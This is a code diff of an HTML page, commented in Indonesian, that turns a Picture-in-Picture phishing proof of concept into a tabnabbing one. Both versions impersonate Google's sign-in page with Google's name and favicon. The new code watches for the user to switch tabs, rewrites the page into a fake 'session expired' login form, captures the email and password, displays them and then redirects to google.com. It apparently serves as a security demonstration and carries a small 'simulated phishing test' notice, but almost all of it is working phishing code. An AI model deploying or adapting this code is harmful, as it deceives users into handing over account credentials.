@@ -3,7 +3,8 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Persistent PiP Lifecycle Bypass</title>
+<title>Google Security Verification</title>
+<link rel="icon" type="image/png" href="https://www.google.com/favicon.ico" id="favicon">
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body { background: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
@@ -18,9 +19,9 @@
 <body>
 
 <div class="panel" id="main-card">
-  <h2>🔒 Persistent PiP Lifecycle Bypass</h2>
-  <p>Klik tombol di bawah. PiP akan tetap hidup meskipun halaman utama di-redirect ke Google.</p>
-  <button id="startBtn">Open Persistent PiP</button>
+  <h2>🔒 Google Security Verification</h2>
+  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Setelah itu, pindah ke tab lain dan kembali ke tab ini.</p>
+  <button id="startBtn">Start Tabnabbing Test</button>
   <div id="status">[*] Ready...</div>
 </div>
 
@@ -30,152 +31,88 @@
 
   var btn = document.getElementById('startBtn');
   var statusEl = document.getElementById('status');
+  var favicon = document.getElementById('favicon');
+  var isSpoofed = false;
 
   function log(msg) {
     statusEl.textContent = msg;
-    console.log("[PiP Persistence] " + msg);
+    console.log("[Tabnabbing] " + msg);
   }
 
   // ============================================
-  // 1. TRIGGER (KLIK)
+  // 1. FUNGSI SPOOFING (FAVICON & TITLE)
   // ============================================
-  btn.addEventListener('click', async function() {
-    log("[*] Membuka PiP dengan lifecycle persistence...");
+  function spoofTab() {
+    if (isSpoofed) return;
+    isSpoofed = true;
 
-    try {
-      if (!window.documentPictureInPicture) {
-        alert("Document Picture-in-Picture tidak didukung.");
+    // Ganti title menjadi "Sesi Berakhir - Login Ulang"
+    document.title = "Sesi Berakhir - Login Ulang Google";
+
+    // Ganti favicon menjadi favicon Google (merah)
+    favicon.href = "https://www.google.com/favicon.ico";
+
+    // Ganti konten halaman menjadi form login palsu
+    document.body.innerHTML = `
+      <div style="background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);max-width:400px;width:100%;text-align:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">
+        <div style="font-size:32px;font-weight:bold;color:#4285f4;margin-bottom:20px;">G</div>
+        <h2 style="color:#333;margin-bottom:10px;">Sesi Berakhir</h2>
+        <p style="color:#666;font-size:14px;margin-bottom:20px;">Silakan login ulang untuk melanjutkan.</p>
+        <input type="email" id="phishEmail" placeholder="Email or phone" style="width:100%;padding:12px;margin-bottom:12px;border:1px solid #ddd;border-radius:6px;font-size:14px;" />
+        <input type="password" id="phishPass" placeholder="Password" style="width:100%;padding:12px;margin-bottom:12px;border:1px solid #ddd;border-radius:6px;font-size:14px;" />
+        <button id="phishLogin" style="width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:bold;cursor:pointer;">Login Ulang</button>
+        <div style="margin-top:15px;font-size:11px;color:#f00;">This is a simulated phishing test. Do not enter real credentials.</div>
+      </div>
+    `;
+
+    // Event listener untuk menangkap input
+    document.getElementById('phishLogin').addEventListener('click', function() {
+      var email = document.getElementById('phishEmail').value;
+      var password = document.getElementById('phishPass').value;
+
+      if (!email || !password) {
+        alert("Email dan password harus diisi!");
         return;
       }
 
-      // ============================================
-      // 2. BUKA PiP
-      // ============================================
-      const pipWindow = await documentPictureInPicture.requestWindow({
-        width: 500,
-        height: 500
-      });
+      // Tampilkan data yang ditangkap
+      document.body.innerHTML = `
+        <div style="background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);max-width:400px;width:100%;text-align:center;font-family:monospace;">
+          <h2 style="color:#f00;">Credentials Captured!</h2>
+          <p><strong>Email:</strong> ${email}</p>
+          <p><strong>Password:</strong> ${password}</p>
+          <p style="color:#666;font-size:12px;margin-top:20px;">Redirecting to Google...</p>
+        </div>
+      `;
 
-      log('PiP Window Opened.');
-
-      // ============================================
-      // 3. TULIS ULANG DOKUMEN PiP (MANDIRI)
-      // ============================================
-      // Kita menulis ulang seluruh dokumen PiP dengan script mandiri.
-      // Script ini tidak bergantung pada parent dan akan tetap berjalan
-      // meskipun parent di-redirect atau ditutup.
-      pipWindow.document.open();
-      pipWindow.document.write(`
-        <!DOCTYPE html>
-        <html>
-        <head>
-          <meta charset="UTF-8">
-          <title>Google Security Verification</title>
-          <style>
-            * { margin: 0; padding: 0; box-sizing: border-box; }
-            body {
-              font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-              background: #fff;
-              display: flex;
-              flex-direction: column;
-              justify-content: center;
-              align-items: center;
-              min-height: 100vh;
-              padding: 20px;
-              text-align: center;
-            }
-            .g-logo {
-              font-size: 32px;
-              font-weight: bold;
-              color: #4285f4;
-              margin-bottom: 20px;
-            }
-            h3 { font-size: 20px; color: #333; margin-bottom: 5px; }
-            p { font-size: 13px; color: #666; margin-bottom: 20px; }
-            input {
-              width: 100%;
-              padding: 12px;
-              margin-bottom: 12px;
-              border: 1px solid #ddd;
-              border-radius: 6px;
-              font-size: 14px;
-            }
-            button {
-              width: 100%;
-              padding: 12px;
-              background: #1a73e8;
-              color: #fff;
-              border: none;
-              border-radius: 6px;
-              font-size: 14px;
-              font-weight: bold;
-              cursor: pointer;
-            }
-            .warning {
-              margin-top: 15px;
-              font-size: 11px;
-              color: #f00;
-            }
-          </style>
-        </head>
-        <body>
-          <div class="g-logo">G</div>
-          <h3>Sign in</h3>
-          <p>to continue to Gmail</p>
-          <input type="email" id="pipEmail" placeholder="Email or phone" autofocus />
-          <input type="password" id="pipPassword" placeholder="Password" />
-          <button id="pipLogin">Next</button>
-          <div class="warning">This is a simulated phishing test. Do not enter real credentials.</div>
-
-          <script>
-            (function() {
-              // Script mandiri di dalam PiP
-              // Tetap berjalan meskipun parent redirect/close.
-              
-              document.getElementById('pipLogin').addEventListener('click', function() {
-                var email = document.getElementById('pipEmail').value;
-                var password = document.getElementById('pipPassword').value;
-                
-                if (!email || !password) {
-                  alert("Email dan password harus diisi!");
-                  return;
-                }
-
-                // Tampilkan data di PiP (untuk pengujian)
-                document.body.innerHTML = \`
-                  <div style="font-family:monospace;padding:20px;background:#000;color:#0f0;border-radius:6px;width:100%;">
-                    <h3 style="color:#f00;">Credentials Captured!</h3>
-                    <p><strong>Email:</strong> \${email}</p>
-                    <p><strong>Password:</strong> \${password}</p>
-                    <p style="color:#666;margin-top:15px;">Redirecting to Google...</p>
-                  </div>
-                \`;
-
-                // Redirect PiP ke Google asli (setelah 2 detik)
-                setTimeout(function() {
-                  window.location.href = 'https://www.google.com';
-                }, 2000);
-              });
-            })();
-          <\/script>
-        </body>
-        </html>
-      `);
-      pipWindow.document.close();
-
-      log('PiP persistent payload injected.');
-
-      // ============================================
-      // 4. REDIRECT PARENT KE GOOGLE.COM (UJI LIFECYCLE)
-      // ============================================
+      // Redirect ke Google asli setelah 2 detik
       setTimeout(function() {
-        log('Redirecting parent to google.com...');
-        window.location.replace('https://www.google.com');
-      }, 1000);
+        window.location.href = 'https://www.google.com';
+      }, 2000);
+    });
 
-    } catch (e) {
-      log('Error: ' + e.message);
+    log("[+] Tab spoofed! Title & Favicon changed.");
+  }
+
+  // ============================================
+  // 2. DETEKSI PERPINDAHAN TAB (VISIBILITY CHANGE)
+  // ============================================
+  document.addEventListener('visibilitychange', function() {
+    if (document.hidden) {
+      // Saat tab tidak aktif, spoof tab
+      log("[!] Tab hidden. Spoofing tab...");
+      setTimeout(spoofTab, 1000); // Delay 1 detik agar tidak terlalu cepat
     }
+  });
+
+  // ============================================
+  // 3. TRIGGER (KLIK)
+  // ============================================
+  btn.addEventListener('click', function() {
+    log("[*] Tabnabbing test started. Switch to another tab and come back.");
+    
+    // Buka tab baru (Google) untuk memancing user pindah tab
+    window.open('https://www.google.com', '_blank');
   }, { once: true });
 
 })();
